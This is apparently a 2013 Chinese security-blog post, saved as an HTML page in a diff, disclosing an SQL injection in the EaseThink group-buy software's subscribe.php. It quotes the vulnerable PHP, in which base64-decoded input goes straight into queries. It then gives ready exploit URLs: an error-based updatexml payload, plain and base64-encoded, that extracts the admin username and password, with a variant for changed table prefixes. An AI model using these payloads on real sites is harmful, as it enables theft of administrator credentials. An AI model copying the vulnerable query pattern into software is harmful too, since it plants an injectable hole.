@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+  <title>易想团购subscribe.php页面sql注入（附exp） | Blog of Secer</title>
+  <meta name="description" content="" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
+  <link rel="stylesheet" type="text/css" href="/css/style.css" />
+  <meta name="generator" content="Blog of Secer">
+
+  
+  
+  
+
+  
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body class="home-template">
+<div id="perspective" class="perspective effect-movedown">
+  <div class="container">
+    <!-- wrapper -->
+    <div class="wrapper">
+
+      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
+    <div class="vertical">
+        <div class="site-head-content inner">
+             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
+            <h1 class="blog-title">Blog of Secer</h1>
+            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
+        </div>
+    </div>
+</header>
+
+      
+
+<main class="content" role="main">
+  <article class="post">
+    <span class="post-meta">
+      <time datetime="2013-08-08T21:35:35.000Z" itemprop="datePublished">
+          2013-08-09
+      </time>
+    
+</span>
+    <h1 class="post-title">易想团购subscribe.php页面sql注入（附exp）</h1>
+    <section class="post-content">
+      <p><a href="http://Ha.Cker.In/tag/易想团购" target="_blank">易想团购</a>subscribe.php这个页面存在问题 </p>  <p>其中除了$_REQUEST[‘act’]==’mail’选项未添加页面发送信息外，其余选项都拼接了用户发送信息。 </p>  <p>属于post表单信息。 </p>  <p>elseif($_REQUEST[‘act’]==’unsubscribe’)    <br>{     <br>&#160;&#160;&#160;&#160;&#160;&#160;&#160; $email_code = trim($_REQUEST[‘code’]);&#160; //只去掉了两端预定义字符     <br>&#160;&#160;&#160;&#160;&#160;&#160;&#160; $email = base64_decode($email_code);&#160;&#160; //简单的base64_decode编码 之后就带入了语句     <br>&#160;&#160;&#160;&#160;&#160;&#160;&#160; if($GLOBALS[‘db’]-&gt;getOne(&quot;select count(*) from &quot;.DB_PREFIX.&quot;mail_list where mail_address=’&quot;.$email.&quot;’&quot;)==0)     <br>&#160;&#160;&#160;&#160;&#160;&#160;&#160; {     <br>showErr($GLOBALS[‘lang’][‘MAIL_NOT_EXIST’],0,APP_ROOT);     <br>&#160;&#160;&#160;&#160;&#160;&#160;&#160; }     <br>&#160;&#160;&#160;&#160;&#160;&#160;&#160; else     <br>&#160;&#160;&#160;&#160;&#160;&#160;&#160; {     <br>send_unsubscribe_mail($email);     <br>showSuccess($GLOBALS[‘lang’][‘MAIL_UNSUBSCRIBE_VERIFY’],0,APP_ROOT);     <br>&#160;&#160;&#160;&#160;&#160;&#160;&#160; }     <br>}     <br>elseif($_REQUEST[‘act’]==’dounsubscribe’)     <br>{     <br>&#160;&#160;&#160;&#160;&#160;&#160;&#160; $email_code = trim($_REQUEST[‘code’]); //和以上一样的错误     <br>&#160;&#160;&#160;&#160;&#160;&#160;&#160; $email_code =&#160; base64_decode($email_code);     <br>&#160;&#160;&#160;&#160;&#160;&#160;&#160; $arr = explode(&quot;|&quot;,$email_code);     <br>&#160;&#160;&#160;&#160;&#160;&#160;&#160; $GLOBALS[‘db’]-&gt;query(&quot;delete from &quot;.DB_PREFIX.&quot;mail_list where code = ‘&quot;.$arr[0].&quot;’ and mail_address = ‘&quot;.$arr[1].&quot;’&quot;);     <br>&#160;&#160;&#160;&#160;&#160;&#160;&#160; $rs = $GLOBALS[‘db’]-&gt;affected_rows();     <br>&#160;&#160;&#160;&#160;&#160;&#160;&#160; if($rs)     <br>&#160;&#160;&#160;&#160;&#160;&#160;&#160; {     <br>showSuccess($GLOBALS[‘lang’][‘MAIL_UNSUBSCRIBE_SUCCESS’],0,APP_ROOT);     <br>&#160;&#160;&#160;&#160;&#160;&#160;&#160; }     <br>&#160;&#160;&#160;&#160;&#160;&#160;&#160; else     <br>&#160;&#160;&#160;&#160;&#160;&#160;&#160; {     <br>showErr($GLOBALS[‘lang’][‘MAIL_UNSUBSCRIBE_FAILED’],0,APP_ROOT);     <br>&#160;&#160;&#160;&#160;&#160;&#160;&#160; }     <br>} </p>  <p>可以看到用户输入很简单的带入了sql语句中，不过最终结果并未直接显示在页面上。还是靠页面返回信息来判断语句执行是否成功 </p>  <p>exp构造： </p>  <blockquote>   <p><a href="http://ha.cker.in/subscribe.php?act=unsubscribe&amp;code=secer'">http://ha.cker.in/subscribe.php?act=unsubscribe&amp;code=<font color="#ff0000">secer’</font>)</a><font color="#ff0000"> and (updatexml(1,concat(0x3a,(select concat(adm_name,0x3a,adm_password) from easethink_admin limit 1)),1))#</font></p> </blockquote>  <p>红色的参数code注入部分base64后：</p>  <blockquote>   <p><a href="http://ha.cker.in/subscribe.php?act=unsubscribe&amp;code=">http://ha.cker.in/subscribe.php?act=unsubscribe&amp;code=</a>c2VjZXInKSBhbmQgKHVwZGF0ZXhtbCgxLGNvbmNhdCgweDNhLChzZWxlY3QgY29uY2F0KGFkbV9uYW1lLDB4M2EsYWRtX3Bhc3N3b3JkKSBmcm9tIGVhc2V0aGlua19hZG1pbiBsaW1pdCAxKSksMSkpIw== </p> </blockquote>  <p>如果不是默认表前缀会报错，修改表前缀后base64编码了再提交。</p>  <p><a href="http://img.cker.in/subscribe.phpsqlexp_BEDD/image.png" target="_blank" rel="external"><img title="image" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="321" alt="image" src="http://img.cker.in/subscribe.phpsqlexp_BEDD/image_thumb.png" width="994" border="0"></a> </p>  <p>修改表前缀</p>  <blockquote>   <p><a href="http://ha.cker.in/subscribe.php?act=unsubscribe&amp;code=secer'">http://ha.cker.in/subscribe.php?act=unsubscribe&amp;code=secer’</a> and (updatexml(1,concat(0x3a,(select concat(adm_name,0x3a,adm_password) from esjj_admin limit 1)),1))#</p> </blockquote>  <p>重新提交</p>  <blockquote>   <p><a href="http://ha.cker.in/subscribe.php?act=unsubscribe&amp;code=c2VjZXInIGFuZCAodXBkYXRleG1sKDEsY29uY2F0KDB4M2EsKHNlbGVjdCBjb25jYXQoYWRtX25hbWUsMHgzYSxhZG1fcGFzc3dvcmQpIGZyb20gZXNqal9hZG1pbiBsaW1pdCAxKSksMSkpIw">http://ha.cker.in/subscribe.php?act=unsubscribe&amp;code=c2VjZXInIGFuZCAodXBkYXRleG1sKDEsY29uY2F0KDB4M2EsKHNlbGVjdCBjb25jYXQoYWRtX25hbWUsMHgzYSxhZG1fcGFzc3dvcmQpIGZyb20gZXNqal9hZG1pbiBsaW1pdCAxKSksMSkpIw</a>==</p> </blockquote>  <p><a href="http://img.cker.in/subscribe.phpsqlexp_BEDD/image_3.png" target="_blank" rel="external"><img title="image" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="279" alt="image" src="http://img.cker.in/subscribe.phpsqlexp_BEDD/image_thumb_3.png" width="1001" border="0"></a></p>
+    </section>
+    <footer class="post-footer">
+      <section class="author">
+    <h4>Secer</h4>
+    <p>记录互联网安全历程与个人成长经历</p>
+</section>
+      <section class="share">
+    <h4>Share this post</h4>
+    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/1020.seo/" target="_blank">
+        <span class="hidden">weibo</span>
+    </a>
+    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/1020.seo/"
+       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <span class="hidden">Twitter</span>
+    </a>
+    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/1020.seo/"
+       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <span class="hidden">Facebook</span>
+    </a>
+    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/1020.seo/"
+       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+        <span class="hidden">Google+</span>
+    </a>
+</section>
+
+    </footer>
+  </article>
+  <nav class="pagination" role="pagination">
+    
+    <a class="newer-posts" href="/1021.seo/">
+        ← 让Mac也能拥有apt-get类似的功能--Brew
+    </a>
+    
+    <span class="icon-logo">•</span>
+    
+    <a class="older-posts" href="/1019.seo/">
+        易想购物link.php sql注入漏洞 →
+    </a>
+    
+</nav>
+
+  <div id="comment" class="comments-area">
+    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
+    
+</div>
+
+</main>
+
+
+      
+<footer class="site-footer">
+  
+  <div class="inner">
+     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
+     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
+  </div>
+</footer>
+
+      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
+<script type="text/javascript" src="/js/index.js"></script>
+<script type="text/javascript" src="/js/menu.js"></script>
+
+
+
+
+
+  </div>
+</div>
+
+<nav  class="outer-nav top horizontal">
+
+          <a class="icon-home"  href="/"><span>Home</span></a>
+
+          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+
+          <a class="icon-image"  href="/images"><span>Images</span></a>
+
+          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+
+          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
+
+          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+
+</nav>
+
+</div>
+</body>
+</html>
